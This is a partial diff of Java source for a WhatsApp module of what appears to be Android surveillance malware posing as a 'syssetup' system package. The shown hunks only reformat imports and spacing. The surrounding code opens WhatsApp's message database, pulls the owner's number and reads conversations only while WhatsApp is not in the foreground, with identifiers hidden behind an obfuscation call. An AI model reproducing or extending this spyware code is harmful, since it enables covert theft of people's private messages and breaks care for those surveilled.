@@ -1,22 +1,10 @@
 package com.android.syssetup.module.chat;
 
-import java.io.File;
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.concurrent.Semaphore;
-
-import javax.xml.parsers.DocumentBuilderFactory;
-
-import org.w3c.dom.Document;
-import org.w3c.dom.NamedNodeMap;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteQueryBuilder;
 
+import com.android.mm.M;
 import com.android.syssetup.RunningProcesses;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.GenericSqliteHelper;
@@ -25,19 +13,27 @@ import com.android.syssetup.file.Path;
 import com.android.syssetup.module.ModuleAddressBook;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
-import com.android.mm.M;
+
+import org.w3c.dom.Document;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.concurrent.Semaphore;
+
+import javax.xml.parsers.DocumentBuilderFactory;
 
 public class ChatWhatsapp extends SubModuleChat {
 	private static final String TAG = "ChatWhatsapp";
-
-	ChatGroups groups = new ChatWhatsappGroups();
-
 	private static final int PROGRAM = 0x06;
-
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
-	String pObserving = M.e("com.whatsapp");
-
 	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
+	ChatGroups groups = new ChatWhatsappGroups();
+	String pObserving = M.e("com.whatsapp");
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	@Override
@@ -67,7 +63,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	/**
 	 * Estrae dal file RegisterPhone.xml il numero di telefono
-	 * 
+	 *
 	 * @return
 	 */
 	@Override
@@ -87,7 +83,7 @@ public class ChatWhatsapp extends SubModuleChat {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
 
 			RunningProcesses runningProcesses = RunningProcesses.self();
-			if(!runningProcesses.getForeground_wrapper().equals(pObserving)) {
+			if (!runningProcesses.getForeground_wrapper().equals(pObserving)) {
 				readChatWhatsappMessages();
 			}
 
@@ -162,7 +158,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	/**
 	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
 	 * messaggi relativi
-	 * 
+	 *
 	 * @throws IOException
 	 */
 	private void readChatWhatsappMessages() throws IOException {
@@ -235,7 +231,7 @@ public class ChatWhatsapp extends SubModuleChat {
 						}
 						markup.writeMarkupSerializable(newLastRead);
 					}
-				}finally {
+				} finally {
 					helper.disposeDb();
 				}
 			} else {
@@ -258,7 +254,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f_f=remote_resources
-		String[] projection = {  M.e("remote_resource") };
+		String[] projection = {M.e("remote_resource")};
 		String selection = M.e("key_remote_jid") + "='" + conversation + "'";
 
 		// final Set<String> remotes = new HashSet<String>();
@@ -301,7 +297,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f.4=_id
 		// f.5=key_remote_jid
 		// f.6=message_table_id
-		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id") };
+		String[] projection = {M.e("_id"), M.e("key_remote_jid"), M.e("message_table_id")};
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
@@ -328,7 +324,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	/**
 	 * Fetch unread messages of a specific conversation
-	 * 
+	 *
 	 * @param db
 	 * @param conversation
 	 * @return
@@ -350,8 +346,8 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f.7=data
 		// f_b=timestamp
 		// f_c=key_from_me
-		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),
-				"remote_resource" };
+		String[] projection = {M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),
+				"remote_resource"};
 
 		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
 		// AND key_remote_jid>$lastReadIndex
@@ -421,7 +417,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		// f_9=@s.whatsapp.net
 		return remote.replaceAll(M.e("@s.whatsapp.net"), "");
 	}
-	
+
 	public class ChatWhatsappGroups extends ChatGroups {
 		@Override
 		boolean isGroup(String peer) {
